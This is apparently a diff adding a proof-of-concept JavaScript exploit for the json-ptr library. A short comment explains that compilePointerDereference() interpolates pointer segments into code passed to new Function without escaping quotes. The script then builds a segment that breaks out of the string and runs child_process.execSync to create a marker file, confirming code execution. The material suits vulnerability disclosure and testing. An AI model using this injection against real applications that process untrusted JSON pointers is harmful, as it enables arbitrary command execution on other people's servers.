@@ -1,0 +1,30 @@
+```javascript
+// Exploit for arbitrary code execution in json-ptr's compilePointerDereference().
+//
+// compilePointerDereference() (node_modules/json-ptr/dist/util.js) builds a
+// JS source string from pointer path segments and hands it to `new Function`.
+// Each segment is only backslash-escaped, never quote-escaped, before being
+// interpolated inside a single-quoted string literal:
+//
+//   typeof((it = it['<segment>'])) !== 'undefined'
+//
+// A segment containing a single quote breaks out of the string literal and
+// injects arbitrary JavaScript that runs whenever JsonPointer#get() is called
+// (e.g. via JsonPointer.create(path).get(target)).
+
+const { JsonPointer } = require("json-ptr");
+
+const maliciousSegment =
+  "a'] , process.mainModule.require('child_process')" +
+  ".execSync('touch /tmp/json-ptr-pwned') , it['a";
+
+const ptr = JsonPointer.create(["x", maliciousSegment]);
+
+// Triggers compilePointerDereference -> new Function(...) with injected code.
+ptr.get({ x: { a: 1 } });
+
+console.log(
+  "RCE triggered:",
+  require("fs").existsSync("/tmp/json-ptr-pwned")
+);
+```
